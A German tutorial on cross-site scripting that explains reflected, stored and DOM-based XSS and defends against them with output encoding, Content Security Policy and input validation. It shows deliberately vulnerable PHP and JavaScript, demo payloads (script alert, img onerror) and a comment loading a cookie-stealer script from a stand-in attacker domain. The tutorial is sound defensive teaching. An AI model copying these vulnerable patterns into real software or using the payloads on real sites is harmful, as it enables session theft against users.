# Schutz vor Cross-Site-Scripting (XSS)

### Schutz vor Cross-Site-Scripting (XSS)

Wenn du Formulare auf deiner Webseite anbietest, öffnest du einen Kommunikationskanal. Deine Nutzer können dir Daten senden – Namen, Kommentare, Suchanfragen. Das ist fantastisch und die Grundlage des interaktiven Webs. Doch dieser Kanal birgt auch eine der häufigsten und hartnäckigsten Sicherheitslücken: Cross-Site-Scripting, kurz XSS.

Stell dir deine Webseite wie eine öffentliche Pinnwand vor. Jeder kann eine Notiz anheften. Normalerweise sind das harmlose Nachrichten. Was aber, wenn jemand eine Notiz anheftet, die unsichtbare Tinte enthält, die bei jedem, der sie liest, eine unangenehme Reaktion auslöst? Genau das ist XSS im übertragenen Sinne. Ein Angreifer schleust über ein Formular keinen normalen Text, sondern bösartigen Code – meist JavaScript – auf deine Webseite ein. Dieser Code wird dann im Browser anderer, unschuldiger Besucher ausgeführt, die deine Seite aufrufen.

Das Ziel eines XSS-Angriffs ist nicht dein Server, sondern der Browser deiner Nutzer. Der eingeschleuste Code läuft mit den Rechten deiner Webseite im Browser des Opfers. Das bedeutet, der Code kann alles tun, was deine Webseite auch tun könnte: Er kann Cookies auslesen (und damit die Sitzung des Nutzers kapern), Passwörter oder Kreditkartendaten abfangen, die Seite verändern oder den Nutzer auf eine gefälschte Phishing-Seite umleiten.

Um dich davor zu schützen, musst du die verschiedenen Arten von XSS verstehen und die richtigen Gegenmaßnahmen ergreifen.

#### Die Anatomie eines Angriffs: Reflected, Stored und DOM-based XSS

XSS ist nicht gleich XSS. Die Angriffe lassen sich grob in drei Kategorien einteilen, die sich darin unterscheiden, wie der bösartige Code zum Opfer gelangt.

##### 1. Reflected XSS (Nicht-persistent)

Dies ist die häufigste Form von XSS. Hier wird der schädliche Code vom Server direkt an den Nutzer "reflektiert" oder zurückgespiegelt. Stell dir eine Suchfunktion auf deiner Webseite vor. Der Nutzer gibt einen Suchbegriff ein, und die Seite zeigt eine Meldung wie "Suchergebnisse für: [Suchbegriff]".

Ein verwundbarer PHP-Code könnte so aussehen:

```php
<?php
  $searchTerm = $_GET['q']; // Holt den Suchbegriff aus der URL
?>
<h1>Suchergebnisse</h1>
<p>Du hast nach "<?php echo $searchTerm; ?>" gesucht.</p>
```

Wenn ein normaler Nutzer nach "Katzenfotos" sucht, ist die URL `deineseite.de/suche?q=Katzenfotos` und alles ist in Ordnung.

Ein Angreifer könnte nun aber eine manipulierte URL erstellen und sie an ein Opfer senden, zum Beispiel per E-Mail oder in einem Chat:

`deineseite.de/suche?q=<script>alert('XSS!');</script>`

Wenn das Opfer auf diesen Link klickt, sendet sein Browser die Anfrage an deinen Server. Dein Server nimmt den Wert von `q` – das komplette Script-Tag – und fügt ihn unverändert in die HTML-Seite ein. Der Browser des Opfers empfängt dann folgenden HTML-Code:

```html
<h1>Suchergebnisse</h1>
<p>Du hast nach "<script>alert('XSS!');</script>" gesucht.</p>
```

Der Browser sieht das `<script>`-Tag und führt den darin enthaltenen JavaScript-Code aus. Anstelle eines harmlosen `alert()` könnte hier natürlich auch Code stehen, der die Session-Cookies des Nutzers an den Server des Angreifers sendet.

##### 2. Stored XSS (Persistent)

Stored XSS ist gefährlicher, weil der schädliche Code dauerhaft auf deinem Server gespeichert wird, zum Beispiel in einer Datenbank. Jedes Mal, wenn ein Nutzer die betroffene Seite aufruft, wird der Code ausgeliefert und ausgeführt. Ein typisches Beispiel sind Kommentarbereiche, Gästebücher oder Nutzerprofile.

Stell dir vor, ein Angreifer schreibt folgenden Kommentar in dein Blog:

`Toller Artikel! <script src="http://boese-seite.de/cookie-stealer.js"></script>`

Wenn dein System diesen Kommentar ungesichert in der Datenbank speichert und ihn später auf der Artikelseite für alle Besucher anzeigt, passiert Folgendes:

1.  Der Angreifer speichert den Kommentar. Dein Server legt den String inklusive des `<script>`-Tags in der Datenbank ab.
2.  Ein anderer Nutzer, nennen wir ihn Max, besucht deinen Blogartikel.
3.  Dein Server holt alle Kommentare aus der Datenbank, inklusive des bösartigen Kommentars.
4.  Der Server sendet die HTML-Seite an Max' Browser, die nun den schädlichen Skript-Tag enthält.
5.  Max' Browser führt das Skript von `boese-seite.de` aus. Dieses Skript stiehlt Max' Session-Cookie und schickt es an den Angreifer. Der Angreifer kann sich nun als Max auf deiner Seite einloggen.

Jeder einzelne Besucher der Seite wird zum Opfer, ohne dass er auf einen speziellen Link klicken muss. Das macht Stored XSS besonders verheerend.

##### 3. DOM-based XSS

Diese Variante ist subtiler. Der Angriff findet ausschließlich im Browser des Opfers statt (im "Document Object Model", kurz DOM), ohne dass der bösartige Code zwangsläufig den Server passieren muss. Die Schwachstelle liegt hier im clientseitigen JavaScript-Code deiner Webseite, der Daten aus der URL liest und sie unsicher in die Seite einfügt.

Ein Beispiel: Deine Seite hat einen JavaScript-Code, der den Namen des Nutzers aus dem URL-Fragment (dem Teil nach dem `#`) liest und ihn auf der Seite begrüßt.

```html
<div id="welcome-message"></div>

<script>
  let name = location.hash.substring(1); // Holt den Teil nach #
  document.getElementById('welcome-message').innerHTML = "Willkommen, " + name + "!";
</script>
```

Der Angreifer schickt dem Opfer wieder einen manipulierten Link:

`deineseite.de/profil#<img src=x onerror="alert('DOM XSS')">`

Der Browser des Opfers lädt die Seite. Das JavaScript liest den Wert aus `location.hash` und schreibt ihn direkt in das `div`-Element via `innerHTML`. Dadurch wird der String nicht als Text, sondern als HTML interpretiert. Der Browser versucht, ein Bild mit der ungültigen Quelle `x` zu laden. Das schlägt fehl und löst das `onerror`-Ereignis aus, welches den schädlichen JavaScript-Code ausführt. Dein Server hat von alldem nichts mitbekommen, da das URL-Fragment (`#...`) niemals an den Server gesendet wird.

#### Die Verteidigung: Deine Strategie gegen XSS

Die gute Nachricht ist: Du kannst dich und deine Nutzer wirksam schützen. Die Strategie basiert auf einer goldenen Regel und mehreren Verteidigungslinien.

**Die goldene Regel lautet: Vertraue niemals den Daten, die vom Nutzer kommen!**

Jede einzelne Information, die über ein Formular, einen URL-Parameter oder eine andere Quelle in dein System gelangt, muss als potenziell bösartig behandelt werden, bis du sie unschädlich gemacht hast.

##### Verteidigungslinie 1: Output Encoding

Das ist die wichtigste und wirksamste Waffe gegen XSS. Die Idee ist einfach: Wenn du Daten, die von einem Nutzer stammen, in eine HTML-Seite einfügst, musst du sicherstellen, dass der Browser diese Daten immer nur als reinen Text interpretiert und niemals als ausführbaren Code.

Das erreichst du, indem du spezielle HTML-Zeichen in ihre harmlosen Äquivalente, die sogenannten HTML-Entitäten, umwandelst. Die fünf wichtigsten Zeichen sind:

*   `<` wird zu `&lt;` (less than)
*   `>` wird zu `&gt;` (greater than)
*   `&` wird zu `&amp;` (ampersand)
*   `"` wird zu `&quot;` (double quote)
*   `'` wird zu `&#39;` (single quote)

Schauen wir uns unser erstes Beispiel mit der Suchfunktion an. Der schädliche Input war `<script>alert('XSS!');</script>`.

Wenn wir diesen String vor der Ausgabe korrekt encodieren, wird daraus:

`&lt;script&gt;alert(&#39;XSS!&#39;);&lt;/script&gt;`

Dieser encodierte String wird vom Browser als harmloser Text angezeigt. Er sieht zwar wie ein Script-Tag aus, aber weil die spitzen Klammern durch ihre Entitäten ersetzt wurden, wird er nicht mehr als HTML-Code interpretiert und ausgeführt.

Praktisch jede serverseitige Sprache bietet dafür eine Funktion. In PHP ist das `htmlspecialchars()`. Der sichere Code für unsere Suchfunktion sieht so aus:

```php
<?php
  $searchTerm = $_GET['q'];
?>
<h1>Suchergebnisse</h1>
<p>Du hast nach "<?php echo htmlspecialchars($searchTerm, ENT_QUOTES, 'UTF-8'); ?>" gesucht.</p>
```
**Wichtig:** Du musst das Encoding immer direkt bei der Ausgabe anwenden, nicht bevor du die Daten in der Datenbank speicherst. So behältst du die Originaldaten und kannst sie für verschiedene Kontexte (HTML, E-Mail, JSON) jeweils korrekt behandeln.

Viele moderne Frameworks und Template-Engines (wie Twig, Blade oder React) führen dieses Output Encoding standardmäßig für dich durch ("Auto-Escaping"). Das ist ein enormer Sicherheitsgewinn. Verlasse dich darauf, aber verstehe, was im Hintergrund passiert.

##### Verteidigungslinie 2: Content Security Policy (CSP)

CSP ist eine zusätzliche, sehr starke Verteidigungslinie. Es handelt sich um einen HTTP-Header, den dein Server mitsendet. Mit diesem Header gibst du dem Browser eine genaue Anweisung, von welchen Quellen er Inhalte (insbesondere Skripte) laden und ausführen darf.

Eine einfache, aber sehr restriktive CSP könnte so aussehen:

`Content-Security-Policy: default-src 'self';`

Dieser Header teilt dem Browser mit: "Lade Inhalte wie Skripte, Stylesheets und Bilder nur von der gleichen Domain, von der auch die Webseite selbst kommt (`'self'`)."

Das hat weitreichende Konsequenzen:

1.  **Keine Inline-Skripte:** Ein Angriff wie `<script>alert('XSS!')</script>` würde blockiert, weil die CSP standardmäßig Inline-Skripte verbietet.
2.  **Kein Laden von externen Skripten:** Der Versuch, ein Skript von einer fremden, bösartigen Domain zu laden (`<script src="http://boese-seite.de/...">`), würde ebenfalls fehlschlagen, da `boese-seite.de` nicht in der Liste der erlaubten Quellen (`'self'`) steht.

Selbst wenn du also eine Lücke im Output Encoding hast, kann eine gut konfigurierte CSP den Angriff oft noch verhindern oder zumindest seine Auswirkungen drastisch reduzieren. Die Konfiguration einer CSP erfordert Sorgfalt, da du alle legitimen externen Quellen (z.B. für Analyse-Tools oder CDNs) explizit erlauben musst, aber der Sicherheitsgewinn ist immens.

##### Verteidigungslinie 3: Eingabevalidierung

Obwohl Output Encoding der primäre Schutz ist, ist es immer eine gute Idee, Nutzereingaben schon bei der Annahme zu validieren. Wenn du in einem Feld eine Telefonnummer erwartest, dann erlaube nur Ziffern und typische Sonderzeichen. Wenn du einen Namen erwartest, sind spitze Klammern vermutlich unerwünscht.

Dies ist jedoch kein Ersatz für Output Encoding. Ein Angreifer kann immer Wege finden, die Validierung zu umgehen. Betrachte die Eingabevalidierung als einen ersten Filter, der offensichtlich ungültige Daten abweist, aber verlasse dich für die eigentliche Sicherheit auf das korrekte Encoding bei der Ausgabe.

Die Sicherheit deiner Formulare und deiner gesamten Webseite liegt in deiner Hand. Indem du das Prinzip "Vertraue niemals Nutzereingaben" verinnerlichst und konsequent Output Encoding sowie moderne Schutzmechanismen wie die Content Security Policy einsetzt, schließt du die Tür für XSS-Angriffe und schützt deine Nutzer vor Datenklau und Manipulation.
